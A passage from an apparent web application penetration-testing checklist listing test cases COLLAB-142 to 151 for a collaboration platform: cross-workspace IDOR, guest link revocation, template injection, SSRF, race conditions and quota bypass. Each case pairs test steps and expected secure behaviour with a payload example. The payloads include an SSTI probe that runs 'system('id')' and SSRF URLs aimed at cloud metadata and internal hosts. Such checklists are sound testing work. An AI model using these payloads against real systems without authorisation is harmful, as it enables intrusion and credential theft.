**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-142 — Guest Access Cross-Workspace Data Leak
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. As a guest in Workspace A attempt to access data from Workspace B. 2. Modify workspace context in requests. 3. Check for data isolation between workspaces for guest accounts.

**Expected Result:** Application must enforce strict workspace isolation for guest accounts preventing any cross-workspace data access.

**Payload Example:**

```
Change workspace_id in API requests from WS-1001 to WS-2001 while authenticated as guest of WS-1001
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-143 — Guest Link Reuse After Revocation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Create a guest access link. 2. Share it with a user. 3. Revoke the guest access. 4. Check if the link still works after revocation. 5. Test with cached sessions.

**Expected Result:** Application must immediately invalidate guest access links upon revocation and terminate active guest sessions.

**Payload Example:**

```
Access guest link URL after admin revokes guest access;test with previously cached guest session cookie
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Browser

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-144 — Document Rendering SSTI
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shared Documents

**Test Steps:** 1. If documents support dynamic rendering or preview inject SSTI payloads. 2. Test with Jinja2 and Twig and Freemarker syntax. 3. Check if template expressions are evaluated in preview.

**Expected Result:** Application must treat document content as static data and not process template syntax during rendering or preview.

**Payload Example:**

```
Document content: {{7*7}};${7*7};#{7*7};<%= system('id') %>;check preview for computed values
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COLLAB-145 — Collaboration Permission Change Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Collaboration

**Test Steps:** 1. While user is actively collaborating revoke their permission. 2. Check if the user retains access through the existing WebSocket connection. 3. Test for delayed permission enforcement.

**Expected Result:** Application must immediately enforce permission changes on active collaboration sessions and disconnect unauthorized users in real-time.

**Payload Example:**

```
Revoke user's edit permission while they have active WebSocket collaboration session;check if edits still propagate
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## COLLAB-146 — Comment Reaction/Vote Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Comments / Annotations

**Test Steps:** 1. If comments support reactions or votes attempt to vote multiple times. 2. Change vote value via parameter manipulation. 3. Vote on behalf of other users. 4. Check for vote count manipulation.

**Expected Result:** Application must enforce one-vote-per-user per comment and validate vote operations server-side.

**Payload Example:**

```
Send multiple POST /api/comments/CMT-1001/react requests;modify voter_id;change reaction_value to inflate count
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-147 — Task Attachment SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Task Assignment

**Test Steps:** 1. If tasks support external link attachments check for SSRF. 2. Attach a URL pointing to internal services. 3. Check if the application fetches the URL for preview or validation.

**Expected Result:** Application must validate task attachment URLs and prevent server-side requests to internal network addresses.

**Payload Example:**

```
attachment_url=http://169.254.169.254/latest/meta-data/;link=http://localhost:8080/admin;preview_url=http://10.0.0.1/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COLLAB-148 — Project Member Addition Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Project Management

**Test Steps:** 1. As a project contributor attempt to add new members. 2. Add users from outside the workspace. 3. Check if member addition is restricted to project managers and admins.

**Expected Result:** Application must restrict project member management to project managers and workspace admins.

**Payload Example:**

```
POST /api/projects/PROJ-1001/members with contributor credentials;add external_user_id to project
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-149 — Gantt Chart Critical Path Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Gantt Chart

**Test Steps:** 1. Modify task dependencies to alter the critical path. 2. Change task durations on the critical path via API. 3. Check if critical path calculations can be manipulated to misrepresent project timeline.

**Expected Result:** Application must recalculate critical path server-side after any dependency or duration changes and not trust client-calculated paths.

**Payload Example:**

```
Modify dependencies to shorten critical path artificially;change duration=30 to duration=1 on critical path tasks
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-150 — Version Storage Quota Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Check if there are storage quotas for version history. 2. Create many versions to exceed the quota. 3. Bypass frontend quota checks via API. 4. Check for resource exhaustion.

**Expected Result:** Application must enforce version storage quotas server-side and handle quota exceeded scenarios gracefully.

**Payload Example:**

```
Create 1000+ versions rapidly via API;check for storage quota enforcement;monitor disk usage
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-151 — Permission Export IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Export permission report for own resources. 2. Change resource_id or workspace_id to export permissions from another workspace. 3. Check for cross-workspace permission data leakage.

**Expected Result:** Application must verify ownership before generating permission reports and restrict exports to the user's authorized resources.

**Payload Example:**

```
GET /api/workspaces/WS-2001/permissions/export with non-member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---
